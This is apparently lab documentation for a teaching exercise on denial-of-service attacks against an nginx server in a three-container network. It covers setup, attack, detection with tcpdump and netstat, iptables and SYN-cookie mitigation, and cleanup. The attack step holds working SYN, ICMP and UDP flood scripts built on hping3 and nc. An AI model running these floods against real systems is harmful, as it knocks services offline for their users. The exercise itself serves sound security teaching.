## Denial-of-Service on IT Services

### Topology

Same three containers as the ARP scenario (can reuse the topology):

| Node             | Role              | Image         | IP Address     | Notes                        |
|------------------|-------------------|---------------|----------------|------------------------------|
| IT-Server        | Target            | Ubuntu/Alpine | 192.168.1.1    | Runs nginx (HTTP on port 80) |
| IT-Workstation   | Legitimate client | Ubuntu/Alpine | 192.168.1.10   | Used to measure impact       |
| Malicious-Client | Attacker          | Ubuntu         | 192.168.1.20   | Needs hping3                 |

### Prerequisites (container setup scripts)

**IT-Server setup** (`setup_server.sh`):
```bash
#!/bin/bash
apt-get update && apt-get install -y nginx net-tools tcpdump iptables
service nginx start
echo "<h1>IT-Server is running</h1>" > /var/www/html/index.html
```

**IT-Workstation setup** (`setup_workstation.sh`):
```bash
#!/bin/bash
apt-get update && apt-get install -y curl net-tools
```

**Malicious-Client setup** (`setup_attacker.sh`):
```bash
#!/bin/bash
apt-get update && apt-get install -y hping3 net-tools
```

### Step-by-Step Scenario

#### Step 1: Establish baseline

On **IT-Workstation**:
```bash
# Confirm server is reachable and responsive
curl -o /dev/null -s -w "Response time: %{time_total}s\n" http://192.168.1.1

# Run a few requests and note normal response times
for i in $(seq 1 5); do
  curl -o /dev/null -s -w "%{time_total}\n" http://192.168.1.1
  sleep 1
done

# Baseline ping latency
ping -c 10 192.168.1.1
```

Record the baseline response times (typically <0.01s for a local container).

#### Step 2: Launch the DoS attack

On **Malicious-Client** — deploy via script injection:

**`dos_syn_flood.sh`**:
```bash
#!/bin/bash
# SYN flood targeting the server's HTTP port
# --flood: send as fast as possible
# -S: SYN flag
# -p 80: target port
# --rand-source: randomize source IP (makes simple IP-based blocking harder)

echo "Starting SYN flood against 192.168.1.1:80..."
hping3 -S --flood -p 80 192.168.1.1
```

Alternative — ICMP flood variant (`dos_icmp_flood.sh`):
```bash
#!/bin/bash
echo "Starting ICMP flood against 192.168.1.1..."
hping3 --icmp --flood 192.168.1.1
```

Alternative — simple bash UDP flood (no hping3 dependency) (`dos_udp_flood.sh`):
```bash
#!/bin/bash
echo "Starting UDP flood against 192.168.1.1:80..."
while true; do
  # /dev/urandom generates random payload; nc sends one UDP packet and exits
  head -c 1024 /dev/urandom | nc -u -w0 192.168.1.1 80 2>/dev/null
done
```

#### Step 3: Observe the impact

On **IT-Workstation** (while attack is running):
```bash
# Measure HTTP response time — should be significantly degraded
for i in $(seq 1 10); do
  curl -o /dev/null -s -w "Response time: %{time_total}s\n" --max-time 5 http://192.168.1.1
  sleep 1
done
# Many requests will timeout or show much higher latency

# Ping latency — compare with baseline
ping -c 10 192.168.1.1
# Expect high latency and packet loss
```

#### Step 4: Detect the attack

On **IT-Server**:
```bash
# Monitor inbound traffic — look for the flood
tcpdump -i eth0 -c 100

# For SYN flood specifically, count SYN packets per second:
timeout 10 tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0' 2>/dev/null | wc -l
# Normal: a handful. Under attack: thousands.

# Check connection states — SYN flood creates many half-open connections
netstat -an | grep SYN_RECV | wc -l
# Normal: 0-2. Under attack: hundreds or more.
```

#### Step 5: Mitigate the attack

On **IT-Server**:

**`dos_mitigation.sh`**:
```bash
#!/bin/bash

# --- SYN flood mitigation ---

# Enable SYN cookies (kernel-level defense against SYN floods)
echo 1 > /proc/sys/net/ipv4/tcp_syncookies

# Rate limit incoming SYN packets: allow 10/second with burst of 20
iptables -A INPUT -p tcp --syn -m limit --limit 10/s --limit-burst 20 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP

# --- ICMP flood mitigation ---

# Rate limit ICMP: allow 5/second with burst of 10
iptables -A INPUT -p icmp -m limit --limit 5/s --limit-burst 10 -j ACCEPT
iptables -A INPUT -p icmp -j DROP

# --- UDP flood mitigation ---

# Rate limit UDP to port 80
iptables -A INPUT -p udp --dport 80 -m limit --limit 10/s --limit-burst 20 -j ACCEPT
iptables -A INPUT -p udp --dport 80 -j DROP

echo "Mitigation rules applied."
echo "Current iptables rules:"
iptables -L -n -v
```

#### Step 6: Verify mitigation

On **IT-Workstation** (while attack is still running):
```bash
# Measure HTTP response time again — should be back near baseline
for i in $(seq 1 10); do
  curl -o /dev/null -s -w "Response time: %{time_total}s\n" --max-time 5 http://192.168.1.1
  sleep 1
done

# Ping should recover
ping -c 10 192.168.1.1
```

On **IT-Server**:
```bash
# Verify that the flood packets are being dropped
iptables -L -n -v
# The DROP rule should show a high packet count

# SYN_RECV connections should be low again
netstat -an | grep SYN_RECV | wc -l
```

#### Cleanup
```bash
# On attacker — stop the flood (Ctrl+C or kill the process)

# On server — remove mitigation rules (to reset for next exercise)
iptables -F
echo 0 > /proc/sys/net/ipv4/tcp_syncookies
```

---

## Notes for Scenario Documentation

- This scenario uses the same three-node topology. They can be packaged as a single AE3GIS topology template with two separate scenario documents.
- The setup scripts (package installation) should ideally be baked into the container images. If not, they can be injected at deploy time using AE3GIS's script injection.
- The attack scripts are designed to be deployed through the AE3GIS script injection interface during the lab.
- MAC addresses in the ARP scenario will vary per deployment. The scenario docs should instruct students to record the real MACs before the attack begins.
- hping3 requires root/NET_ADMIN capabilities. Docker containers in GNS3 typically run as root, so this should work by default.
- The `--rand-source` flag in hping3 may not work in all container network configurations. If it causes issues, remove it — the attack works fine with the real source IP (and it makes detection easier, which is fine for educational purposes).